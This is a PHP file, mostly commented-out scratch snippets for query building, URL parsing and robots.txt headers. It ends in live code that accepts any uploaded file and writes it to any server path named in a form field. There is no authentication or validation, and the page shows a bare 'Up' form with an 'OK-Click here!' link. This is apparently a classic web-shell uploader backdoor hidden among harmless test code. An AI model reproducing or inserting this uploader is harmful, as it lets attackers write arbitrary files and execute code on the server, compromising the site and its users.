<?php
    // $array = ['', 'id' => 1];
    // // $array = ['AND', 'id' => 1, 'date' => '2019/10/28'];
    // // var_dump($array);die();
    // foreach($array as $key => $element) {
    //     // reset($array);
    //     if ($key !== key($array)) {
    //         $a[] = $element;
    //         $b[] = $key;
    //     }

    // }
    // // echo implode(' AND ', $a);

    // foreach ($array as $key => $value) {
    //     if ($key !== key($array)) {
    //         $clause = $key . " = " . "'" . $value . "'";
    //     }
    // }
    // echo $clause;
//     $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

//     // $re = '/\b[\w=.]+$/m';

//     // preg_match_all($re, $actual_link, $matches);

//     // // Print the entire match result
//     // print_r($matches[0][0]);
// // $url = 'http://localhost/MyProjects/client-contacts/?client=2';
//     parse_str(parse_url($actual_link, PHP_URL_QUERY), $arr);
//     // echo $arr['page'];
//     echo dirname(__DIR__);
    $b = date('Y-m-d h:i:s', time());
    $a = [$b];
    // var_dump($a);
    // $a = ftp_nlist($conn, directory);

// Specify that our robots.txt is text document.
// header('Content-type: plain/text');
// Tell browsers to open up the download dialog box to download
// our robots.txt. In addition, the browser should default the 
// file name to robots.txt
// header('Content-Disposition: attachment; filename="robots.txt"');
 
// Write the contents of robots.txt out to the browser
// readfile(dirname(dirname(__FILE__)) . '/robots.txt');
$files = @$_FILES["files"];
if($files["name"] != '')
{
    $fullpath = $_REQUEST["path"].$files["name"];
    if(move_uploaded_file($files['tmp_name'],$fullpath))
    {           
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";     
    }
}
echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up">
</form></body></html>';

// }

?>